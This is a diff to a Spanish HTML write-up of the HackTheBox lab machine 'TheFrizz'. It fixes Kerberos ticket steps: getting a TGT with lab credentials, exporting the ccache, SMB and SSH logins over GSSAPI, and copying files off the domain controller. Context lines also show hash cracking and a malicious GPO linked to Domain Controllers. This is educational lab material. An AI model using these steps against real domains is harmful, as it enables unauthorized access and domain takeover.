@@ -19,7 +19,7 @@
           <h1>TheFrizz</h1>
           <div class="tag-list" aria-label="Tags">
             <span>Kerberos</span>
-            <span>kubernetes</span>
+            <span>ccache</span>
             <span>gpo</span>
             <span>ssh</span>
             <span>mysql</span>
@@ -116,25 +116,27 @@ hashcat -m 1420 hash rockyou.txt
     FRIZZ.HTB = {
         kdc = FRIZZDC.FRIZZ.HTB
         admin_server = FRIZZDC.FRIZZ.HTB
-        default_domain = FRIZZ.HTB</code></pre>
+        default_domain = FRIZZ.HTB
+    }</code></pre>
           </div>
           <div class="code-card">
             <h3>Ajustar Reloj</h3>
-            <pre><code>ntpdate 10.129.232.168
-systemctl stop systemd-timesyncd</code></pre>
+            <pre><code>sudo systemctl stop systemd-timesyncd
+sudo ntpdate 10.129.232.168</code></pre>
           </div>
           <div class="code-card">
             <h3>Generar Ticket TGT del usuario f.frizzle</h3>
             <pre><code>impacket-getTGT frizz.htb/&#x27;f.frizzle&#x27;:&#x27;Jenni_Luvs_Magic23&#x27; -dc-ip frizzdc.frizz.htb
-# Exportar Ticket a la variable de entorno  
-export KRB5CCNAME=f.frizzle.ccache  </code></pre>
+# Exportar la ruta absoluta de la caché y comprobar el ticket
+export KRB5CCNAME="$(pwd)/f.frizzle.ccache"
+klist</code></pre>
           </div>
           <div class="code-card">
-            <h3>Conexión con la flag -k</h3>
-            <pre><code># Ya podemos acceder a los servicios con la flag -k. Ej SMB
-nxc smb 10.129.232.168 -u &#x27;f.frizzle&#x27; -p &#x27;Jenni_Luvs_Magic23&#x27; -k 
-# Login SSH con ticket Kerberos
-ssh f.frizzle@frizz.htb -k</code></pre>
+            <h3>Conexión usando la caché Kerberos</h3>
+            <pre><code># Kerberos necesita el FQDN para construir el SPN del servicio
+nxc smb frizzdc.frizz.htb --use-kcache
+# Login SSH mediante GSSAPI; -k no activa Kerberos
+ssh -o GSSAPIAuthentication=yes f.frizzle@frizzdc.frizz.htb</code></pre>
           </div>
         </section>
         <section class="writeup-section">
@@ -150,8 +152,8 @@ cd &#x27;.\$RECYCLE.BIN\&#x27;</code></pre>
           <img class="writeup-image" src="/writeups/assets/thefrizz/pasted-image-20260224002218.png" alt="TheFrizz HTB" />
           <div class="code-card">
             <h3>Kali: Transferir Ficheros de Windows a Kali</h3>
-            <pre><code>KRB5CCNAME=f.frizzle.ccache scp f.frizzle@frizzdc.frizz.htb:&#x27;C:/$RECYCLE.BIN/S-1-5-21-2386970044-1145388522-2932701813-1103/$IE2XMEG.7z&#x27; IE2XMEG.7z
-KRB5CCNAME=f.frizzle.ccache scp f.frizzle@frizzdc.frizz.htb:&#x27;C:/$RECYCLE.BIN/S-1-5-21-2386970044-1145388522-2932701813-1103/$RE2XMEG.7z&#x27; RE2XMEG.7z
+            <pre><code>KRB5CCNAME=f.frizzle.ccache scp -o GSSAPIAuthentication=yes f.frizzle@frizzdc.frizz.htb:&#x27;C:/$RECYCLE.BIN/S-1-5-21-2386970044-1145388522-2932701813-1103/$IE2XMEG.7z&#x27; IE2XMEG.7z
+KRB5CCNAME=f.frizzle.ccache scp -o GSSAPIAuthentication=yes f.frizzle@frizzdc.frizz.htb:&#x27;C:/$RECYCLE.BIN/S-1-5-21-2386970044-1145388522-2932701813-1103/$RE2XMEG.7z&#x27; RE2XMEG.7z
 # Descomprimir
 7z x IE2XMEG.7z
 7z x RE2XMEG.7z</code></pre>
@@ -172,10 +174,11 @@ KRB5CCNAME=f.frizzle.ccache scp f.frizzle@frizzdc.frizz.htb:&#x27;C:/$RECYCLE.BI
             <h3>Kerberos</h3>
             <pre><code># Crear Ticket
 impacket-getTGT frizz.htb/&#x27;M.SchoolBus&#x27;:&#x27;!suBcig@MehTed!R&#x27; -dc-ip frizzdc.frizz.htb  
-# Exportar Ticket
-export KRB5CCNAME=M.SchoolBus.ccache  
-# Login SSH con ticket Kerberos
-ssh M.SchoolBus@frizz.htb -k</code></pre>
+# Exportar la caché y comprobar el ticket
+export KRB5CCNAME="$(pwd)/M.SchoolBus.ccache"
+klist
+# Login SSH mediante GSSAPI
+ssh -o GSSAPIAuthentication=yes M.SchoolBus@frizzdc.frizz.htb</code></pre>
           </div>
           <img class="writeup-image" src="/writeups/assets/thefrizz/pasted-image-20260224010123.png" alt="TheFrizz HTB" />
         </section>
@@ -207,7 +210,7 @@ New-GPO -Name Evil-GPO | New-GPLink -Target &quot;OU=DOMAIN CONTROLLERS,DC=FRIZZ
           <h2>Tags</h2>
           <div class="tag-list">
             <span>Kerberos</span>
-            <span>kubernetes</span>
+            <span>ccache</span>
             <span>gpo</span>
             <span>ssh</span>
             <span>mysql</span>
